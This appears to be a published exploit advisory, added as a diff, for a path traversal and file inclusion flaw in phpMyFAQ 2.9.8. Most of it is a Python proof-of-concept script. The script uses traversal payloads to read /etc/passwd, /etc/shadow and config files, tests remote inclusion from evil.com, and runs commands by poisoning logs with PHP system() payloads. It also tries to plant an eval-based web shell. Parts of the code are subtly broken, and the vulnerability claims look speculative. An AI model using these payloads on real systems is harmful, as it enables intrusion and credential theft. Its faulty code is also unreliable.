@@ -1,0 +1,180 @@
+=============================================================================================================================================
+| # Title     : phpMyFAQ 2.9.8 Path Traversal                                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/thorsten/phpMyFAQ/blob/main/phpmyfaq/admin/index.php                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212427/ &	CVE-2017-15734, CVE-2017-15735
+
+[+] Summary : The provided PHP code for the PHPMyFAQ administration panel contains several critical security vulnerabilities that could allow attackers to compromise the system:
+
+[+] Key Vulnerabilities Identified:
+
+[+] Path Traversal (Directory Traversal) Vulnerabilities
+
+        Unvalidated file paths in $loader->load() and include statements
+
+        Allows attackers to access sensitive system files (/etc/passwd, /etc/shadow, configuration files)
+
+[+] Local File Inclusion (LFI)
+
+        Potential to include arbitrary local files via parameter manipulation
+
+        Could lead to source code disclosure or remote code execution
+
+[+] Potential Remote File Inclusion (RFI)
+
+        If allow_url_include is enabled, attackers could load malicious code from remote servers
+
+[+] Insufficient Input Validation
+
+        No validation or sanitization of file paths before loading/including them
+
+[+] Exploitation Vectors:
+
+    File Disclosure: Read sensitive system and configuration files
+
+    Log Poisoning + LFI: Inject PHP code into log files and then include them
+
+    Remote Code Execution: Through RFI or crafted file inclusions
+
+    Web Shell Upload: Using various PHP wrappers and techniques
+
+[+]  Usage : 
+
+python3 poc.py https://target.com
+
+[+]  POC : 
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+import urllib.parse
+
+class PMFExploit:
+    def __init__(self, target_url):
+        self.target = target_url.rstrip('/')
+        self.session = requests.Session()
+    
+    def check_lfi(self, file_path):
+        """LFI vulnerability scan"""
+        payloads = [
+            f"../../../../../../../../../../{file_path}",
+            f"....//....//....//....//{file_path}",
+            f"..%2f..%2f..%2f..%2f{file_path}"
+        ]
+        
+        for payload in payloads:
+            try:
+       
+                params = {'config': payload}
+                response = self.session.get(f"{self.target}/admin/index.php", params=params)
+                
+                if "root:" in response.text or "DB_PASSWORD" in response.text:
+                    print(f"[+] LFI Found! File: {file_path}")
+                    print(f"[+] Payload: {payload}")
+                    return response.text[:500]
+            except Exception as e:
+                continue
+        return None
+    
+    def rfi_test(self, remote_url):
+        """اختبار RFI"""
+        params = {'routes': remote_url}
+        try:
+            response = self.session.get(f"{self.target}/admin/index.php", params=params)
+            if response.status_code == 200:
+                print("[+] RFI might be possible")
+                return True
+        except:
+            pass
+        return False
+    
+    def log_poisoning(self, cmd):
+        """Poisoning records and carrying out orders"""
+   
+        php_code = f'<?php system("{cmd}"); ?>'
+        
+        headers = {
+            'User-Agent': php_code,
+            'X-Forwarded-For': php_code
+        }
+        
+        self.session.get(self.target, headers=headers)
+        
+    
+        log_files = [
+            '/var/log/apache2/access.log',
+            '/var/log/httpd/access_log',
+            '/var/log/nginx/access.log',
+            '/usr/local/apache2/logs/access_log'
+        ]
+        
+        for log_file in log_files:
+            result = self.check_lfi(log_file)
+            if result and 'uid=' in result:
+                print(f"[+] Command executed via {log_file}")
+                return result
+    
+    def upload_shell(self):
+        """Attempting to upload webshell"""
+        shell_code = "<?php eval($_POST['cmd']); ?>"
+
+        temp_paths = [
+            '/tmp/shell.php',
+            '/dev/shm/shell.php',
+            '/var/tmp/shell.php'
+        ]
+        
+        for temp_path in temp_paths:
+  
+            payload = f"data://text/plain;base64,{shell_code.encode('base64')}"
+            params = {'config': payload}
+            
+            response = self.session.get(f"{self.target}/admin/index.php", params=params)
+            if response.status_code == 200:
+                print(f"[+] Shell possibly uploaded to {temp_path}")
+    
+    def exploit(self):
+        print(f"[*] Targeting: {self.target}")
+        print("[*] Checking for LFI vulnerabilities...")
+
+        sensitive_files = [
+            '/etc/passwd',
+            '/etc/shadow',
+            '/proc/self/environ',
+            '.env',
+            'config.php',
+            'configuration.php'
+        ]
+        
+        for file in sensitive_files:
+            result = self.check_lfi(file)
+            if result:
+                print(f"\n[!] Contents of {file}:")
+                print(result)
+
+        print("\n[*] Testing for RFI...")
+        if self.rfi_test("http://evil.com/shell.txt"):
+            print("[!] RFI vulnerability found!")
+
+        print("\n[*] Attempting command execution via log poisoning...")
+        self.log_poisoning("id")
+        
+        print("\n[*] Attempting to upload web shell...")
+        self.upload_shell()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target_url>")
+        sys.exit(1)
+    
+    exploit = PMFExploit(sys.argv[1])
+    exploit.exploit()
+	
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
